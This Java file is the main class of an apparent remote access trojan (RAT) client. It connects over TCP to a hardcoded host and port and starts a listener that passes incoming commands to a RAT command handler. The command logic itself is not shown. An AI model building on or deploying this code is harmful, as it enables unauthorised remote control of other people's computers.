package com.cool;
import java.io.IOException;
import java.net.UnknownHostException;

import com.cool.remote.RAT;
import com.cool.tcp.*;
public class main {

	static String _HOSTIP = "localhost";
	static int _HOSTPORT = 9001;
	static boolean _CONNECTED = false;
	static client conn;

	public static void main(String[] args) throws IOException {
		conn = new client(_HOSTIP,_HOSTPORT);
		conn.KeepAlive.Enable();
		if (conn.Connect())
		{
			conn.StartListener(10,new RAT().new Command());
		}
	}

}
